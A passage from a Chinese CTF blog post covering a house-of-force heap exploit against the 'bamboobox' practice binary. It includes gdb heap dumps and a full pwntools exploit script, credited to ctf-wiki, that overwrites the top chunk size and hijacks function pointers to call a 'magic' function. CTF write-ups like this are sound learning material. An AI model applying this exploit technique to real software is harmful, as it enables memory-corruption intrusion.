class="line">0x7f2a72614b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00000000025ed000</span><br><span class="line">0x7f2a72614b80 &lt;main_arena+96&gt;:	0x0000000000000000	0x00007f2a72614b78</span><br><span class="line">0x7f2a72614b90 &lt;main_arena+112&gt;:	0x00007f2a72614b78	0x00007f2a72614b88</span><br><span class="line">0x7f2a72614ba0 &lt;main_arena+128&gt;:	0x00007f2a72614b88	0x00007f2a72614b98</span><br><span class="line">0x7f2a72614bb0 &lt;main_arena+144&gt;:	0x00007f2a72614b98	0x00007f2a72614ba8</span><br><span class="line">gdb-peda$ x/10gx 0x00000000025ed000</span><br><span class="line">0x25ed000:	0x0000000000000000	0x0000000000000059</span><br><span class="line">0x25ed010:	0x0000000000400896	0x00000000004008b1</span><br><span class="line">0x25ed020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x25ed030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x25ed040:	0x6161616161616161	0x6161616161616161</span><br></pre></td></tr></table></figure>

<p>你看成功转移到这里了，现在在malloc一次就可以了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">0x1483000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x21, </span><br><span class="line">  fd = 0x400d49 &lt;magic&gt;, </span><br><span class="line">  bk = 0x400d49 &lt;magic&gt;, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x39</span><br><span class="line">&#125;</span><br><span class="line">0x1483020 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x39, </span><br><span class="line">  fd = 0x6161616161616161, </span><br><span class="line">  bk = 0x6161616161616161, </span><br><span class="line">  fd_nextsize = 0x6161616161616161, </span><br><span class="line">  bk_nextsize = 0x6161616161616161</span><br><span class="line">&#125;</span><br><span class="line">0x1483058 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x6161616161616161, </span><br><span class="line">  size = 0x6161616161616161, </span><br><span class="line">  fd = 0xffffffffffffa1, </span><br><span class="line">  bk = 0xa, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功覆盖，最后退出一下就好了</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>这里直接用的ctf-wiki的exp,我只改动了一处，他还减多个0xf,没看懂，所以删掉了，也没事</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./bamboobox'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">additem</span><span class="params">(length, name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(idx, length, name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400d49</span></span><br><span class="line"><span class="comment"># we must alloc enough size, so as to successfully alloc from fake topchunk</span></span><br><span class="line">additem(<span class="number">0x30</span>, <span class="string">"ddaa"</span>)  <span class="comment"># idx 0</span></span><br><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span>  <span class="comment"># idx 0's content</span></span><br><span class="line">payload += <span class="string">'a'</span> * <span class="number">8</span> + p64(<span class="number">0xffffffffffffffff</span>)  <span class="comment"># top chunk's prev_size and size</span></span><br><span class="line"><span class="comment"># modify topchunk's size to -1</span></span><br><span class="line">modify(<span class="number">0</span>, <span class="number">0x41</span>, payload)</span><br><span class="line"><span class="comment"># top chunk's offset to heap base</span></span><br><span class="line">offset_to_heap_base = -(<span class="number">0x40</span> + <span class="number">0x20</span>)</span><br><span class="line">malloc_size = offset_to_heap_base - <span class="number">0x8</span> </span><br><span class="line">additem(malloc_size, <span class="string">"dada"</span>)</span><br><span class="line">additem(<span class="number">0x10</span>, p64(magic) * <span class="number">2</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一次性学了house of einherjar和house of force,ctf-wiki还是强，不过有些得自己调试才好,适合自己的才是最好的</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

  </div>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="site-author-image" itemprop="image" alt="LiHua"
    src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">LiHua</p>
  <div class="site-description" itemprop="description">One people that no one know</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">51</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">28</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">25</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">LiHua</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    <span title="Symbols count total">268k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">4:04</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.0.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.4.2
  </div>

        












        
      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
<script src="/js/schemes/muse.js"></script>
<script src="/js/next-boot.js"></script>



  
















  

  

</body>
</html>
